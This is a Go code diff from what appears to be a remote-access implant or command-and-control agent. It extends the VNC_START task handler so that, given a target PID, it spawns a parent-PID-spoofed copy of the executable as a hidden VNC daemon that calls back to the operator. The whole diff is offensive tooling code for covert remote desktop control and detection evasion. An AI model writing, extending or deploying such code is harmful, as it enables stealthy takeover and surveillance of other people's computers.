@@ -1284,10 +1284,11 @@ func dispatchTask(t transport, task taskWire) {
 	// ── Interactive VNC desktop ───────────────────────────────────────────────
 
 	case "VNC_START":
-		// Args: "<callbackPort> [quality]"  quality = 1-100, default 60
+		// Args: "<callbackPort> <quality> [<pid>]"
+		// pid > 0 → spawn a PPID-spoofed copy of this exe in VNC daemon mode
 		parts := strings.Fields(strings.TrimSpace(task.Args))
 		if len(parts) == 0 {
-			t.sendResult(task.ID, "", "usage: VNC_START <callback_port> [quality]")
+			t.sendResult(task.ID, "", "usage: VNC_START <callback_port> [quality] [pid]")
 			return
 		}
 		quality := 60
@@ -1296,11 +1297,26 @@ func dispatchTask(t transport, task taskWire) {
 				quality = q
 			}
 		}
-		if err := vncStart(parts[0], quality); err != nil {
-			t.sendResult(task.ID, "", err.Error())
-			return
+		targetPID := 0
+		if len(parts) >= 3 {
+			if p, err := strconv.Atoi(parts[2]); err == nil && p > 0 {
+				targetPID = p
+			}
 		}
-		t.sendResult(task.ID, "[+] VNC session started (callback port "+parts[0]+")", "")
+		if targetPID > 0 {
+			childPID, err := vncSpawnInject(parts[0], quality, targetPID)
+			if err != nil {
+				t.sendResult(task.ID, "", err.Error())
+				return
+			}
+			t.sendResult(task.ID, fmt.Sprintf("[+] VNC spawned (PID %d) PPID-spoofed to %d (callback :%s)", childPID, targetPID, parts[0]), "")
+		} else {
+			if err := vncStart(parts[0], quality); err != nil {
+				t.sendResult(task.ID, "", err.Error())
+				return
+			}
+			t.sendResult(task.ID, "[+] VNC session started (callback port "+parts[0]+")", "")
+		}
 
 	case "VNC_STOP":
 		t.sendResult(task.ID, vncStop(), "")
